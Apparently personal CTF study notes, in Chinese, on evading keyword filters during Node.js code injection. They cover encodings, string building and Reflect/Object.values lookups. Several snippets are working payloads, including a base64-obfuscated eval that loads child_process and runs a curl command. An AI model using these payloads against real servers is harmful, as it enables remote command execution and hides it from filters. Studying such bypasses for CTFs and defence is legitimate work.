- 总体思路和SSTI相似
- [[CTF/JS/弱类型]]
- # 关键字
	- 16进制编码
		- ```js
		  console.log("a"==="\x61");
		  ```
	- unicode编码
		- ```js
		  console.log("\u0061"==="a");
		  ```
	- 加号拼接
	- 模板字符串
		- ```js
		  var s = `${'fl'}ag`
		  ```
	- concat连接
		- ```js
		  "exe".concat("cSync")
		  ```
	- base64编码
		- ```js
		  eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString())
		  ```
- # 取属性
	- Object.values
		- ```js
		  Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')
		  ```
	- Refrect
		- ```js
		  console.log(Reflect.ownKeys(global))
		  //返回所有函数
		  console.log(global[Reflect.ownKeys(global).find(x=>x.includes('eval'))])
		  //拿到eval
		  ```
- # 参考
	- https://www.anquanke.com/post/id/237032